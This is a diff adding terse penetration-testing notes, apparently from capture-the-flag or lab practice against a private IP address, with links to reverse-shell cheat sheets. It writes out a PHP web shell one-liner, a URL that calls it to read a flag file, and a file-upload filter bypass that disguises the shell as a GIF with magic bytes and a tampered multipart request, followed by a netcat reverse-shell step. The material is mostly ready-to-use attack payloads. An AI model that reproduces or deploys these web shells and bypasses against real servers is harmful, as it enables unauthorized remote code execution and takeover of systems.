@@ -1,0 +1,33 @@
+source : https://highon.coffee/blog/reverse-shell-cheat-sheet/
+generator : https://www.revshells.com/
+
+
+UPLOAD A WEBSHELL FILE 
+		create a file webshell.php5
+		<?php system($_GET['cmd']);?>
+	LOCATE THE FILE ON THE SERVER
+		http://10.10.151.108/uploads/webshell.php5?cmd=less%20../../user.txt
+			and other reverse shell cmds
+	
+	
+	REFERENCE: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+
+
+file upload bypass and php reverse shell	
+		https://gobiasinfosec.blog/2019/12/24/file-upload-attacks-php-reverse-shell/
+		
+		create a file e.g test.php
+			<?php system($_GET[‘c’]);?>
+		rename to test.php.gif
+		upload file and intercept it
+			Intercept the upload and inject it with the following information:
+    		  {Content-Disposition: form-data; name=”myFile”; filename=”payload.php.gif”
+    			Content-Type: image/gif
+
+    			GIF89a;
+    			<?php system($_GET[‘c’]);?> }
+    			
+    			setup netcat listener 
+    			paste your reverse shell  code in it 
+    			
